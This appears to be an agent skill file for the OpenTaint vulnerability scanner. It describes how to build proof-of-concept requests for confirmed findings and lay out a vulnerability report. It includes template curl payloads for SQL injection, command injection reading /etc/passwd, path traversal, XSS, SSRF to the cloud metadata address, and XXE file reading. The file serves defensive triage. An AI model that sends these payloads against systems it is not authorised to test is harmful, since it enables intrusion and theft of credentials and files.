---
name: generate-poc
description: Build a proof-of-concept for a confirmed true-positive OpenTaint finding (SQLi, command injection, path traversal, XSS, SSRF, XXE) and document it. Use when a SARIF finding has been confirmed as a TP
license: Apache-2.0
metadata:
  author: opentaint
  version: "0.1"
---

# Skill: Generate PoC

Generate a proof-of-concept for a confirmed true positive finding

## Prerequisites

- A finding classified as TRUE POSITIVE (analyze-findings skill)
- Triage input includes: VULN number, rule ID, CWE, severity, source/sink locations, trace steps

## Procedure

### 1. Construct PoC by vulnerability type

Use the source/sink location and trace from the triage to determine the HTTP route, parameter name, and payload shape. If the actual host and port are not known, use `http://<host>:<port>` as a placeholder.

**SQL Injection**: Input that extracts data or bypasses auth
```bash
curl "http://<host>:<port>/api/users?id=1' OR '1'='1"
```

**Command Injection**: Input that executes arbitrary commands
```bash
curl "http://<host>:<port>/api/process?cmd=;cat /etc/passwd"
```

**Path Traversal**: Input that accesses unauthorized files
```bash
curl "http://<host>:<port>/api/files?path=../../../etc/passwd"
```

**XSS**: Input that executes JavaScript
```bash
curl "http://<host>:<port>/api/search?q=<script>alert(1)</script>"
```

**SSRF**: Input that makes the server request internal resources
```bash
curl "http://<host>:<port>/api/fetch?url=http://169.254.169.254/latest/meta-data/"
```

**XXE**: XML input that reads files
```bash
curl -X POST "http://<host>:<port>/api/parse" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
```

For other CWE classes, construct an HTTP request that delivers the tainted source value to the identified sink parameter.

### 2. Document the finding

Use the triage input to fill in the template:

```markdown
## <VULN-NNN>: <short description> in <ClassName.methodName>

**Severity**: <severity> (<CWE>)
**Location**: `<sink file path>:<line>`
**Rule**: `<rule ID>`

### Description
<one sentence: what tainted data flows from where to what dangerous operation>

### Trace
1. **Source**: `<source method>` -- `<tainted call>` (line <N>)
2. **Flow**: <key intermediate steps>
3. **Sink**: `<sink call>` (line <N>)

### Proof of Concept
```
<curl command>
```

### Remediation
<one sentence on the correct fix>
```

Return this markdown block as output to the main agent. The main agent appends it to `.opentaint/vulnerabilities.md`.
